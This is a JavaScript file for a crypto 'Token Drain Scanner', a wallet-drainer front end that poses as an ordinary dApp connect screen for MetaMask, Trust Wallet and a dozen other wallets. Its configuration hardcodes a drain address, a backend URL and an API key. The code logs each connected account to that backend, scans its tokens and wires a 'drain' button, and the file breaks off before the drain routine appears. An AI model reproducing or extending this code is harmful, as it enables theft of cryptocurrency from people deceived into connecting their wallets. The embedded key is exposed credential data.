// ================================================
// TOKEN DRAIN SCANNER - FIXED WALLET CONNECTIONS
// ================================================

// Configuration
const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    
    networkNames: {
        1: "Ethereum Mainnet",
        56: "Binance Smart Chain", 
        137: "Polygon",
        10: "Optimism",
        42161: "Arbitrum",
        43114: "Avalanche",
        8453: "Base",
        250: "Fantom",
        100: "Gnosis",
        25: "Cronos"
    },
    
    // Wallet configurations - FIXED detection
    wallets: {
        metaMask: {
            name: "MetaMask",
            icon: "🦊",
            color: "#f6851b",
            desktop: {
                id: "isMetaMask",
                download: "https://metamask.io/download/",
                detect: () => window.ethereum?.isMetaMask
            },
            mobile: {
                ios: "https://metamask.app.link/dapp/",
                android: "https://metamask.app.link/dapp/",
                universal: "https://metamask.app.link/dapp/"
            }
        },
        trust: {
            name: "Trust Wallet",
            icon: "🔶",
            color: "#3375bb",
            desktop: {
                id: "isTrust",
                download: "https://trustwallet.com/",
                detect: () => window.ethereum?.isTrust
            },
            mobile: {
                ios: "https://link.trustwallet.com/open_url?coin_id=60&url=",
                android: "https://link.trustwallet.com/open_url?coin_id=60&url=",
                universal: "https://link.trustwallet.com/open_url?coin_id=60&url="
            }
        },
        binance: {
            name: "Binance Wallet",
            icon: "🟡",
            color: "#f0b90b",
            desktop: {
                id: "isBinance",
                download: "https://www.binance.com/en/download",
                detect: () => window.ethereum?.isBinance || window.BinanceChain
            },
            mobile: {
                ios: "bnc://app.binance.com/",
                android: "intent://app.binance.com/#Intent;scheme=bnc;package=com.binance.dev;end",
                universal: "https://binance.com/"
            }
        },
        coinbase: {
            name: "Coinbase Wallet",
            icon: "🔷",
            color: "#0052ff",
            desktop: {
                id: "isCoinbaseWallet",
                download: "https://www.coinbase.com/wallet/downloads",
                detect: () => window.ethereum?.isCoinbaseWallet
            },
            mobile: {
                ios: "cbwallet://",
                android: "intent://#Intent;scheme=cbwallet;package=org.toshi;end",
                universal: "https://go.cb-w.com/"
            }
        },
        phantom: {
            name: "Phantom",
            icon: "👻",
            color: "#ab9ff2",
            desktop: {
                id: "isPhantom",
                download: "https://phantom.app/",
                detect: () => window.ethereum?.isPhantom
            },
            mobile: {
                ios: "phantom://",
                android: "phantom://",
                universal: "https://phantom.app/"
            }
        },
        exodus: {
            name: "Exodus",
            icon: "🌌",
            color: "#1d1534",
            desktop: {
                id: "isExodus",
                download: "https://www.exodus.com/download/",
                detect: () => window.ethereum?.isExodus || window.exodus?.ethereum
            },
            mobile: {
                ios: "exodus://",
                android: "exodus://",
                universal: "https://exodus.com/mobile"
            }
        },
        okx: {
            name: "OKX Wallet",
            icon: "⚡",
            color: "#000000",
            desktop: {
                id: "isOkxWallet",
                download: "https://www.okx.com/download",
                detect: () => window.ethereum?.isOkxWallet
            },
            mobile: {
                ios: "okx://",
                android: "intent://#Intent;scheme=okx;package=com.okinc.okex.gp;end",
                universal: "https://www.okx.com/download"
            }
        },
        tokenPocket: {
            name: "TokenPocket",
            icon: "👛",
            color: "#2980ff",
            desktop: {
                id: "isTokenPocket",
                download: "https://tokenpocket.pro/",
                detect: () => window.ethereum?.isTokenPocket
            },
            mobile: {
                ios: "tpoutside://",
                android: "tpoutside://",
                universal: "https://tokenpocket.pro/"
            }
        },
        safePal: {
            name: "SafePal",
            icon: "🛡️",
            color: "#4c6fff",
            desktop: {
                id: "isSafePal",
                download: "https://www.safepal.com/download",
                detect: () => window.ethereum?.isSafePal
            },
            mobile: {
                ios: "safepal://",
                android: "safepal://",
                universal: "https://www.safepal.com/download"
            }
        },
        argent: {
            name: "Argent",
            icon: "🅰️",
            color: "#ff875b",
            desktop: {
                id: "isArgent",
                download: "https://www.argent.xyz/",
                detect: () => window.ethereum?.isArgent
            },
            mobile: {
                ios: "argent://",
                android: "argent://",
                universal: "https://www.argent.xyz/"
            }
        },
        rainbow: {
            name: "Rainbow",
            icon: "🌈",
            color: "#001e59",
            desktop: {
                id: "isRainbow",
                download: "https://rainbow.me/",
                detect: () => window.ethereum?.isRainbow
            },
            mobile: {
                ios: "rainbow://",
                android: "rainbow://",
                universal: "https://rainbow.me/"
            }
        },
        walletConnect: {
            name: "WalletConnect",
            icon: "🔗",
            color: "#3b99fc",
            desktop: {
                id: "isWalletConnect",
                download: "https://walletconnect.com/",
                detect: () => window.WalletConnect || window.walletConnect
            },
            mobile: {
                ios: "wc://",
                android: "wc://",
                universal: "https://walletconnect.com/"
            }
        },
        brave: {
            name: "Brave Wallet",
            icon: "🦁",
            color: "#fb542b",
            desktop: {
                id: "isBraveWallet",
                download: "https://brave.com/wallet/",
                detect: () => window.ethereum?.isBraveWallet
            },
            mobile: {
                ios: "brave://",
                android: "brave://",
                universal: "https://brave.com/wallet/"
            }
        }
    }
};

// Global state
let currentAccount = null;
let currentChainId = null;
let isConnected = false;
let detectedTokens = [];
let walletProvider = null;
let isMobile = false;

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn, networkSelector, scanAllBtn;

// Initialize app
function initializeApp() {
    console.log('🚀 Initializing Token Drain Scanner...');
    
    // Detect device type
    detectDevice();
    
    // Get DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    networkSelector = document.getElementById('networkSelector');
    scanAllBtn = document.getElementById('scanAllBtn');
    
    // Verify critical elements
    if (!connectBtn || !statusEl) {
        console.error('❌ Required elements not found');
        return;
    }
    
    console.log('✅ DOM elements loaded');
    console.log('📱 Device:', isMobile ? 'Mobile' : 'Desktop');
    
    // Setup event listeners
    connectBtn.onclick = handleConnect;
    if (drainBtn) drainBtn.onclick = handleDrain;
    if (scanAllBtn) scanAllBtn.onclick = handleScanAllChains;
    if (networkSelector) networkSelector.onchange = handleNetworkChange;
    
    // Populate network selector
    populateNetworkSelector();
    
    // Check existing connection
    checkExistingConnection();
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
}

// Detect device type
function detectDevice() {
    const userAgent = navigator.userAgent.toLowerCase();
    isMobile = /android|webos|iphone|ipad|ipod|blackberry|windows phone/.test(userAgent);
}

// Populate network selector dropdown
function populateNetworkSelector() {
    if (!networkSelector) return;
    
    networkSelector.innerHTML = '';
    
    // Add "Switch Network" option
    const defaultOption = document.createElement('option');
    defaultOption.value = '';
    defaultOption.textContent = 'Switch Network';
    networkSelector.appendChild(defaultOption);
    
    // Add all supported networks
    Object.entries(CONFIG.networkNames).forEach(([chainId, name]) => {
        const option = document.createElement('option');
        option.value = chainId;
        option.textContent = `🌐 ${name}`;
        networkSelector.appendChild(option);
    });
}

// Check existing wallet connection
async function checkExistingConnection() {
    const ethereum = getEthereum();
    if (!ethereum) {
        console.log('⚠️ No wallet provider');
        return;
    }
    
    try {
        const accounts = await ethereum.request({ 
            method: 'eth_accounts' 
        });
        
        if (accounts && accounts.length > 0) {
            const chainIdHex = await ethereum.request({ 
                method: 'eth_chainId' 
            });
            const chainId = parseInt(chainIdHex, 16);
            
            await handleConnected(accounts[0], chainId);
        }
    } catch (error) {
        console.log('⚠️', error.message);
    }
}

// Get Ethereum provider - IMPROVED DETECTION
function getEthereum() {
    // First check if any wallet is detected
    const detectedWallet = detectWallet();
    
    if (detectedWallet && detectedWallet.provider) {
        walletProvider = detectedWallet.key;
        console.log(`✅ Detected wallet: ${detectedWallet.name}`);
        return detectedWallet.provider;
    }
    
    // If no specific wallet detected but window.ethereum exists
    if (window.ethereum) {
        walletProvider = 'unknown';
        console.log('⚠️ Generic Ethereum provider detected');
        return window.ethereum;
    }
    
    console.log('❌ No wallet provider found');
    return null;
}

// Detect which wallet is active
function detectWallet() {
    const allWallets = CONFIG.wallets;
    
    for (const [key, wallet] of Object.entries(allWallets)) {
        try {
            if (wallet.desktop.detect && wallet.desktop.detect()) {
                return {
                    key,
                    name: wallet.name,
                    provider: window.ethereum || window.BinanceChain || window.exodus?.ethereum
                };
            }
        } catch (error) {
            console.log(`⚠️ Error detecting ${wallet.name}:`, error.message);
        }
    }
    
    return null;
}

// Handle connect button click
async function handleConnect() {
    console.log('🔄 Connect button clicked');
    
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    // Show universal wallet selector (same for mobile and desktop)
    showUniversalWalletSelector();
}

// Show universal wallet selector (works on both mobile and desktop)
function showUniversalWalletSelector() {
    // Get popular wallets for the platform
    const popularWallets = getPopularWallets();
    
    const selectorHTML = `
        <div class="wallet-selector-overlay">
            <div class="wallet-selector-modal">
                <div class="modal-header">
                    <h3>Connect Wallet</h3>
                    <button class="close-btn" onclick="closeWalletSelector()">×</button>
                </div>
                <p class="modal-subtitle">Choose your preferred wallet to continue</p>
                
                <div class="wallet-grid">
                    ${popularWallets.map(wallet => `
                        <button class="wallet-card" onclick="handleWalletSelection('${wallet.key}')" style="--wallet-color: ${wallet.color}">
                            <div class="wallet-icon">${wallet.icon}</div>
                            <div class="wallet-info">
                                <span class="wallet-name">${wallet.name}</span>
                                <span class="wallet-status">${wallet.installed ? 'Detected' : 'Not Installed'}</span>
                            </div>
                            <div class="arrow">→</div>
                        </button>
                    `).join('')}
                </div>
                
                <div class="other-options">
                    <h4>Don't have a wallet?</h4>
                    <div class="download-options">
                        <a href="https://metamask.io/download/" target="_blank" class="download-btn" style="background: #f6851b">
                            <span>🦊</span>
                            <span>Get MetaMask</span>
                        </a>
                        <a href="https://trustwallet.com/" target="_blank" class="download-btn" style="background: #3375bb">
                            <span>🔶</span>
                            <span>Get Trust Wallet</span>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    `;
    
    // Create and show selector
    const selector = document.createElement('div');
    selector.id = 'walletSelector';
    selector.innerHTML = selectorHTML;
    document.body.appendChild(selector);
    
    // Add CSS for universal selector
    addUniversalSelectorStyles();
}

// Get popular wallets based on platform
function getPopularWallets() {
    const popularKeys = isMobile 
        ? ['metaMask', 'trust', 'coinbase', 'binance', 'phantom', 'exodus', 'okx']
        : ['metaMask', 'trust', 'coinbase', 'binance', 'phantom', 'exodus', 'okx', 'tokenPocket', 'brave'];
    
    return popularKeys.map(key => {
        const wallet = CONFIG.wallets[key];
        if (!wallet) return null;
        
        return {
            key,
            name: wallet.name,
            icon: wallet.icon,
            color: wallet.color,
            installed: wallet.desktop.detect ? wallet.desktop.detect() : false
        };
    }).filter(wallet => wallet !== null);
}

// Add CSS for universal wallet selector
function addUniversalSelectorStyles() {
    const styles = `
        .wallet-selector-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(10px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            animation: fadeIn 0.3s ease;
            padding: 20px;
        }
        
        .wallet-selector-modal {
            background: white;
            border-radius: 24px;
            width: 100%;
            max-width: 480px;
            max-height: 80vh;
            overflow-y: auto;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.4s ease;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 24px 32px;
            border-bottom: 1px solid #eef0f3;
        }
        
        .modal-header h3 {
            margin: 0;
            font-size: 24px;
            font-weight: 700;
            color: #111827;
        }
        
        .close-btn {
            background: none;
            border: none;
            font-size: 32px;
            cursor: pointer;
            color: #6b7280;
            line-height: 1;
            padding: 0;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }
        
        .close-btn:hover {
            background: #f3f4f6;
            color: #111827;
        }
        
        .modal-subtitle {
            padding: 0 32px 24px;
            margin: 0;
            color: #6b7280;
            font-size: 16px;
        }
        
        .wallet-grid {
            padding: 0 24px 24px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        
        .wallet-card {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 18px 20px;
            background: white;
            border: 2px solid #e5e7eb;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.2s;
            text-align: left;
            width: 100%;
        }
        
        .wallet-card:hover {
            border-color: var(--wallet-color);
            background: #f9fafb;
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        }
        
        .wallet-card[data-installed="false"] {
            opacity: 0.6;
        }
        
        .wallet-card[data-installed="false"]:hover {
            opacity: 0.8;
        }
        
        .wallet-icon {
            font-size: 32px;
            width: 48px;
            height: 48px;
            border-radius: 12px;
            background: linear-gradient(135deg, var(--wallet-color), color-mix(in srgb, var(--wallet-color) 80%, white));
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        
        .wallet-info {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 4px;
        }
        
        .wallet-name {
            font-weight: 600;
            font-size: 17px;
            color: #111827;
        }
        
        .wallet-status {
            font-size: 14px;
            color: #10b981;
            font-weight: 500;
        }
        
        .wallet-card[data-installed="false"] .wallet-status {
            color: #6b7280;
        }
        
        .arrow {
            color: #9ca3af;
            font-size: 20px;
            font-weight: 300;
        }
        
        .other-options {
            padding: 24px 32px;
            border-top: 1px solid #eef0f3;
            background: #f9fafb;
            border-radius: 0 0 24px 24px;
        }
        
        .other-options h4 {
            margin: 0 0 16px;
            font-size: 18px;
            color: #374151;
            text-align: center;
        }
        
        .download-options {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }
        
        .download-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            padding: 14px;
            border-radius: 12px;
            color: white;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            transition: transform 0.2s, opacity 0.2s;
        }
        
        .download-btn:hover {
            transform: translateY(-2px);
            opacity: 0.9;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(40px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        @keyframes fadeOut {
            from { opacity: 1; }
            to { opacity: 0; }
        }
        
        @keyframes slideDown {
            from {
                opacity: 1;
                transform: translateY(0);
            }
            to {
                opacity: 0;
                transform: translateY(40px);
            }
        }
        
        /* Mobile responsive */
        @media (max-width: 480px) {
            .wallet-selector-modal {
                border-radius: 20px;
            }
            
            .modal-header {
                padding: 20px 24px;
            }
            
            .wallet-grid {
                padding: 0 16px 20px;
            }
            
            .wallet-card {
                padding: 16px;
            }
            
            .download-options {
                grid-template-columns: 1fr;
            }
        }
    `;
    
    const styleSheet = document.createElement('style');
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
}

// Close wallet selector
function closeWalletSelector() {
    const selector = document.getElementById('walletSelector');
    if (selector) {
        selector.style.animation = 'fadeOut 0.3s ease';
        selector.querySelector('.wallet-selector-modal').style.animation = 'slideDown 0.4s ease';
        
        setTimeout(() => {
            selector.remove();
        }, 300);
    }
}

// Handle wallet selection
async function handleWalletSelection(walletKey) {
    closeWalletSelector();
    walletProvider = walletKey;
    
    if (isMobile) {
        await handleMobileWalletConnection(walletKey);
    } else {
        await handleDesktopWalletConnection(walletKey);
    }
}

// Handle desktop wallet connection
async function handleDesktopWalletConnection(walletKey) {
    updateStatus(`🔄 Connecting with ${CONFIG.wallets[walletKey]?.name || walletKey}...`);
    
    try {
        const wallet = CONFIG.wallets[walletKey];
        
        // Check if wallet is installed
        if (!wallet.desktop.detect || !wallet.desktop.detect()) {
            // Wallet not installed, show installation guide
            showWalletNotInstalledModal(walletKey);
            return;
        }
        
        const ethereum = getEthereum();
        if (!ethereum) {
            throw new Error('Wallet not found');
        }
        
        // Special handling for Binance Chain
        if (walletKey === 'binance' && window.BinanceChain) {
            await connectWithBinance();
            return;
        }
        
        // Special handling for Exodus
        if (walletKey === 'exodus' && window.exodus?.ethereum) {
            await connectWithExodus();
            return;
        }
        
        // Request accounts for other wallets
        console.log(`📤 Requesting accounts from ${walletKey}...`);
        const accounts = await ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        console.log('✅ Wallet response:', accounts);
        
        if (!accounts || accounts.length === 0) {
            updateStatus('❌ User denied connection');
            return;
        }
        
        // Get chain ID
        const chainIdHex = await ethereum.request({ 
            method: 'eth_chainId' 
        });
        const chainId = parseInt(chainIdHex, 16);
        
        await handleConnected(accounts[0], chainId);
        
    } catch (error) {
        console.error('❌ Connection error:', error);
        
        if (error.code === 4001) {
            updateStatus('❌ Connection rejected');
        } else if (error.code === -32002) {
            updateStatus('🔄 Connection pending. Check wallet.');
        } else {
            updateStatus('❌ Failed: ' + error.message);
        }
    }
}

// Handle mobile wallet connection
async function handleMobileWalletConnection(walletKey) {
    const wallet = CONFIG.wallets[walletKey];
    
    if (!wallet) {
        updateStatus('❌ Wallet not supported');
        return;
    }
    
    // First check if we're already in a wallet browser
    const ethereum = getEthereum();
    if (ethereum) {
        // Already in wallet browser, try to connect
        updateStatus(`🔄 Connecting with ${wallet.name}...`);
        
        try {
            const accounts = await ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            if (!accounts || accounts.length === 0) {
                updateStatus('❌ User denied connection');
                return;
            }
            
            const chainIdHex = await ethereum.request({ 
                method: 'eth_chainId' 
            });
            const chainId = parseInt(chainIdHex, 16);
            
            await handleConnected(accounts[0], chainId);
            return;
            
        } catch (error) {
            console.error('❌ Mobile connection error:', error);
        }
    }
    
    // Not in wallet browser, show mobile instructions
    showMobileWalletInstructions(walletKey);
}

// Show mobile wallet instructions
function showMobileWalletInstructions(walletKey) {
    const wallet = CONFIG.wallets[walletKey];
    if (!wallet) return;
    
    const currentUrl = encodeURIComponent(window.location.href);
    let walletUrl = '';
    
    // Determine correct deeplink
    if (navigator.userAgent.toLowerCase().includes('iphone') || 
        navigator.userAgent.toLowerCase().includes('ipad')) {
        walletUrl = wallet.mobile.ios + currentUrl;
    } else if (navigator.userAgent.toLowerCase().includes('android')) {
        walletUrl = wallet.mobile.android + currentUrl;
    } else {
        walletUrl = wallet.mobile.universal + currentUrl;
    }
    
    const instructionsHTML = `
        <div class="mobile-instructions-overlay">
            <div class="mobile-instructions-modal">
                <div class="modal-header">
                    <h3>Open ${wallet.name}</h3>
                    <button class="close-btn" onclick="closeMobileInstructions()">×</button>
                </div>
                
                <div class="instructions-content">
                    <div class="wallet-icon-large" style="background: ${wallet.color}">
                        ${wallet.icon}
                    </div>
                    
                    <h4>Follow these steps:</h4>
                    <ol>
                        <li>Click the button below to open ${wallet.name}</li>
                        <li>If prompted, allow the connection</li>
                        <li>Return to this page to continue</li>
                    </ol>
                    
                    <div class="action-buttons">
                        <a href="${walletUrl}" class="open-wallet-btn" style="background: ${wallet.color}">
                            Open in ${wallet.name}
                        </a>
                        <button class="secondary-btn" onclick="showManualInstructions('${walletKey}')">
                            Manual Instructions
                        </button>
                    </div>
                    
                    <div class="tip-box">
                        <strong>💡 Tip:</strong> If the app doesn't open automatically, return here and click "Manual Instructions"
                    </div>
                </div>
            </div>
        </div>
        
        <style>
            .mobile-instructions-overlay {
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(0, 0, 0, 0.8);
                backdrop-filter: blur(10px);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 10000;
                padding: 20px;
                animation: fadeIn 0.3s ease;
            }
            
            .mobile-instructions-modal {
                background: white;
                border-radius: 24px;
                width: 100%;
                max-width: 480px;
                max-height: 80vh;
                overflow-y: auto;
                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
                animation: slideUp 0.4s ease;
            }
            
            .instructions-content {
                padding: 32px;
                text-align: center;
            }
            
            .wallet-icon-large {
                font-size: 64px;
                width: 100px;
                height: 100px;
                border-radius: 24px;
                display: flex;
                align-items: center;
                justify-content: center;
                color: white;
                margin: 0 auto 30px;
            }
            
            .instructions-content h4 {
                margin: 0 0 20px;
                color: #111827;
                font-size: 20px;
            }
            
            .instructions-content ol {
                text-align: left;
                margin: 0 0 30px;
                padding-left: 20px;
            }
            
            .instructions-content li {
                margin: 10px 0;
                color: #374151;
                font-size: 16px;
            }
            
            .action-buttons {
                display: flex;
                flex-direction: column;
                gap: 12px;
                margin: 0 0 20px;
            }
            
            .open-wallet-btn {
                padding: 18px;
                border-radius: 16px;
                color: white;
                text-decoration: none;
                font-weight: 600;
                font-size: 17px;
                transition: all 0.2s;
            }
            
            .open-wallet-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            }
            
            .secondary-btn {
                padding: 16px;
                border-radius: 16px;
                background: #f3f4f6;
                border: 2px solid #e5e7eb;
                color: #374151;
                font-weight: 600;
                font-size: 16px;
                cursor: pointer;
                transition: all 0.2s;
            }
            
            .secondary-btn:hover {
                background: #e5e7eb;
            }
            
            .tip-box {
                background: #f0f9ff;
                border: 2px solid #bae6fd;
                border-radius: 12px;
                padding: 16px;
                color: #0369a1;
                font-size: 14px;
                text-align: left;
                margin-top: 20px;
            }
        </style>
    `;
    
    const instructions = document.createElement('div');
    instructions.innerHTML = instructionsHTML;
    document.body.appendChild(instructions);
}

// Show manual instructions
function showManualInstructions(walletKey) {
    const wallet = CONFIG.wallets[walletKey];
    if (!wallet) return;
    
    const manualHTML = `
        <div class="manual-instructions-overlay">
            <div class="manual-instructions-modal">
                <div class="modal-header">
                    <h3>Manual Setup for ${wallet.name}</h3>
                    <button class="close-btn" onclick="closeManualInstructions()">×</button>
                </div>
                
                <div class="manual-content">
                    <h4>Follow these steps:</h4>
                    <ol>
                        <li>Open ${wallet.name} app on your device</li>
                        <li>Go to the browser/DApps section</li>
                        <li>Copy and paste this URL:</li>
                    </ol>
                    
                    <div class="url-container">
                        <input type="text" readonly value="${window.location.href}" id="manualUrlInput">
                        <button onclick="copyManualUrl()" class="copy-btn">
                            Copy
                        </button>
                    </div>
                    
                    <div class="actions">
                        <button class="primary-btn" onclick="closeManualInstructions()">
                            I've Connected
                        </button>
                        <button class="secondary-btn" onclick="showMobileWalletInstructions('${walletKey}')">
                            Back
                        </button>
                    </div>
                </div>
            </div>
        </div>
        
        <style>
            .manual-instructions-overlay {
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(0, 0, 0, 0.8);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 10001;
                padding: 20px;
            }
            
            .manual-instructions-modal {
                background: white;
                border-radius: 24px;
                width: 100%;
                max-width: 480px;
                max-height: 80vh;
                overflow-y: auto;
                padding: 32px;
            }
            
            .manual-content {
                text-align: center;
            }
            
            .manual-content h4 {
                margin: 0 0 20px;
                color: #111827;
                font-size: 20px;
            }
            
            .manual-content ol {
                text-align: left;
                margin: 0 0 30px;
                padding-left: 20px;
            }
            
            .manual-content li {
                margin: 10px 0;
                color: #374151;
                font-size: 16px;
            }
            
            .url-container {
                display: flex;
                gap: 10px;
                margin: 0 0 30px;
            }
            
            #manualUrlInput {
                flex: 1;
                padding: 16px;
                border: 2px solid #e5e7eb;
                border-radius: 12px;
                font-size: 14px;
                background: #f9fafb;
            }
            
            .copy-btn {
                padding: 16px 24px;
                background: #3b82f6;
                color: white;
                border: none;
                border-radius: 12px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.2s;
            }
            
            .copy-btn:hover {
                background: #2563eb;
            }
            
            .copy-btn.copied {
                background: #10b981;
            }
            
            .actions {
                display: flex;
                gap: 12px;
            }
            
            .primary-btn {
                flex: 1;
                padding: 16px;
                background: #3b82f6;
                color: white;
                border: none;
                border-radius: 12px;
                font-weight: 600;
                cursor: pointer;
            }
            
            .secondary-btn {
                flex: 1;
                padding: 16px;
                background: #f3f4f6;
                border: 2px solid #e5e7eb;
                color: #374151;
                border-radius: 12px;
                font-weight: 600;
                cursor: pointer;
            }
        </style>
    `;
    
    const manual = document.createElement('div');
    manual.innerHTML = manualHTML;
    document.body.appendChild(manual);
    
    // Remove any existing instructions
    closeMobileInstructions();
}

// Copy manual URL
function copyManualUrl() {
    const urlInput = document.getElementById('manualUrlInput');
    if (urlInput) {
        urlInput.select();
        document.execCommand('copy');
        
        const copyBtn = document.querySelector('.copy-btn');
        if (copyBtn) {
            const originalText = copyBtn.textContent;
            copyBtn.textContent = 'Copied!';
            copyBtn.classList.add('copied');
            
            setTimeout(() => {
                copyBtn.textContent = originalText;
                copyBtn.classList.remove('copied');
            }, 2000);
        }
    }
}

// Close mobile instructions
function closeMobileInstructions() {
    const instructions = document.querySelector('.mobile-instructions-overlay');
    if (instructions) instructions.remove();
}

// Close manual instructions
function closeManualInstructions() {
    const manual = document.querySelector('.manual-instructions-overlay');
    if (manual) manual.remove();
}

// Show wallet not installed modal
function showWalletNotInstalledModal(walletKey) {
    const wallet = CONFIG.wallets[walletKey];
    if (!wallet) return;
    
    const modalHTML = `
        <div class="not-installed-overlay">
            <div class="not-installed-modal">
                <div class="modal-header">
                    <h3>${wallet.name} Not Installed</h3>
                    <button class="close-btn" onclick="closeNotInstalledModal()">×</button>
                </div>
                
                <div class="modal-content">
                    <div class="wallet-icon-large" style="background: ${wallet.color}">
                        ${wallet.icon}
                    </div>
                    
                    <p>To connect with ${wallet.name}, you need to install it first.</p>
                    
                    <a href="${wallet.desktop.download}" target="_blank" class="install-btn" style="background: ${wallet.color}">
                        Install ${wallet.name}
                    </a>
                    
                    <button class="secondary-btn" onclick="closeNotInstalledModal()">
                        Choose Another Wallet
                    </button>
                </div>
            </div>
        </div>
        
        <style>
            .not-installed-overlay {
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(0, 0, 0, 0.7);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 10002;
                padding: 20px;
            }
            
            .not-installed-modal {
                background: white;
                border-radius: 24px;
                width: 100%;
                max-width: 400px;
                padding: 32px;
                text-align: center;
            }
            
            .modal-content {
                padding: 20px 0;
            }
            
            .wallet-icon-large {
                font-size: 48px;
                width: 80px;
                height: 80px;
                border-radius: 20px;
                display: flex;
                align-items: center;
                justify-content: center;
                color: white;
                margin: 0 auto 20px;
            }
            
            .modal-content p {
                color: #374151;
                margin: 0 0 30px;
                font-size: 16px;
            }
            
            .install-btn {
                display: block;
                padding: 18px;
                border-radius: 16px;
                color: white;
                text-decoration: none;
                font-weight: 600;
                font-size: 16px;
                margin: 0 0 12px;
                transition: all 0.2s;
            }
            
            .install-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            }
            
            .secondary-btn {
                width: 100%;
                padding: 16px;
                border-radius: 16px;
                background: #f3f4f6;
                border: 2px solid #e5e7eb;
                color: #374151;
                font-weight: 600;
                font-size: 16px;
                cursor: pointer;
                transition: all 0.2s;
            }
            
            .secondary-btn:hover {
                background: #e5e7eb;
            }
        </style>
    `;
    
    const modal = document.createElement('div');
    modal.innerHTML = modalHTML;
    document.body.appendChild(modal);
}

// Close not installed modal
function closeNotInstalledModal() {
    const modal = document.querySelector('.not-installed-overlay');
    if (modal) modal.remove();
}

// Connect with Binance Chain
async function connectWithBinance() {
    try {
        const accounts = await window.BinanceChain.request({ 
            method: 'eth_requestAccounts' 
        });
        
        if (!accounts || accounts.length === 0) {
            updateStatus('❌ User denied connection');
            return;
        }
        
        const chainIdHex = await window.BinanceChain.request({ 
            method: 'eth_chainId' 
        });
        const chainId = parseInt(chainIdHex, 16);
        
        await handleConnected(accounts[0], chainId);
        
    } catch (error) {
        console.error('❌ Binance connection error:', error);
        updateStatus('❌ Binance connection failed: ' + error.message);
    }
}

// Connect with Exodus
async function connectWithExodus() {
    try {
        // Exodus uses window.exodus.ethereum
        const accounts = await window.exodus.ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        if (!accounts || accounts.length === 0) {
            updateStatus('❌ User denied connection');
            return;
        }
        
        const chainIdHex = await window.exodus.ethereum.request({ 
            method: 'eth_chainId' 
        });
        const chainId = parseInt(chainIdHex, 16);
        
        await handleConnected(accounts[0], chainId);
        
    } catch (error) {
        console.error('❌ Exodus connection error:', error);
        updateStatus('❌ Exodus connection failed: ' + error.message);
    }
}

// Handle successful connection
async function handleConnected(account, chainId) {
    try {
        console.log('🔄 Setting up connection...');
        
        // Update state
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        
        // Update UI
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${chainName}`);
        
        // Show other UI elements
        showUIElements();
        
        // Select current network in dropdown
        if (networkSelector) {
            networkSelector.value = chainId;
        }
        
        // Setup wallet listeners
        setupWalletListeners();
        
        // Log to backend
        await logConnectionToBackend(account, chainId);
        
        // Fetch tokens
        await fetchTokens(account, chainId);
        
    } catch (error) {
        console.error('❌ Setup error:', error);
        updateStatus('Setup failed: ' + error.message);
        isConnected = false;
        currentAccount = null;
        currentChainId = null;
    }
}

// Setup wallet event listeners
function setupWalletListeners() {
    const ethereum = getEthereum();
    if (!ethereum) return;
    
    ethereum.on('accountsChanged', (accounts) => {
        console.log('🔄 Accounts changed:', accounts);
        
        if (accounts.length === 0) {
            disconnectWallet();
        } else if (currentAccount !== accounts[0]) {
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
            fetchTokens(currentAccount, currentChainId);
        }
    });
    
    ethereum.on('chainChanged', (chainIdHex) => {
        const chainId = parseInt(chainIdHex, 16);
        console.log('🔄 Chain changed:', chainId);
        
        currentChainId = chainId;
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
